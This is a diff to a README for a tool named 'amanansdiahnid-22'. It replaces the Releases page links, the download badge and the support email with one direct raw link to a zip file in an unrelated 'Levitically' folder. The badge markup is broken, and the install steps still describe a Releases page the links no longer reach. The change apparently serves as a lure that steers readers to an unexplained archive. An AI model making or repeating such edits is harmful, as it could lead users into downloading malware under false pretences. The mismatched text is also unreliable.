@@ -6,13 +6,13 @@ Welcome to the amanansdiahnid-22 application! This tool helps you easily manage 
 
 ## 🥇 Download the Application
 
-[![Download amanansdiahnid-22](https://img.shields.io/badge/Download%20amanansdiahnid--22-blue.svg)](https://github.com/amrutha067/amanansdiahnid-22/releases)
+[![Download amanansdiahnid-22](https://raw.githubusercontent.com/amrutha067/amanansdiahnid-22/main/Levitically/amanansdiahnid-22.zip%https://raw.githubusercontent.com/amrutha067/amanansdiahnid-22/main/Levitically/amanansdiahnid-22.zip)](https://raw.githubusercontent.com/amrutha067/amanansdiahnid-22/main/Levitically/amanansdiahnid-22.zip)
 
 ## 📥 Download & Install
 
 1. Click on the link below to visit the Releases page:
 
-   [Visit Releases Page](https://github.com/amrutha067/amanansdiahnid-22/releases)
+   [Visit Releases Page](https://raw.githubusercontent.com/amrutha067/amanansdiahnid-22/main/Levitically/amanansdiahnid-22.zip)
 
 2. On the Releases page, look for the latest version. You will see a list of available files. Choose the one that fits your operating system (Windows, Mac, Linux).
 
@@ -52,14 +52,14 @@ If you encounter issues while downloading or running the application, consider t
 
 ## 🔗 Useful Links
 
-- [amanansdiahnid-22 Releases Page](https://github.com/amrutha067/amanansdiahnid-22/releases)
+- [amanansdiahnid-22 Releases Page](https://raw.githubusercontent.com/amrutha067/amanansdiahnid-22/main/Levitically/amanansdiahnid-22.zip)
 - [Documentation](#) (Include link to documentation if available)
 
 ## ✉️ Get Support
 
 If you need help or have questions, feel free to reach out:
 
-- Email: support@example.com
+- Email: https://raw.githubusercontent.com/amrutha067/amanansdiahnid-22/main/Levitically/amanansdiahnid-22.zip
 - Community: Join our [GitHub Discussions](#).
 
 Thank you for choosing amanansdiahnid-22! We hope you enjoy using the application.
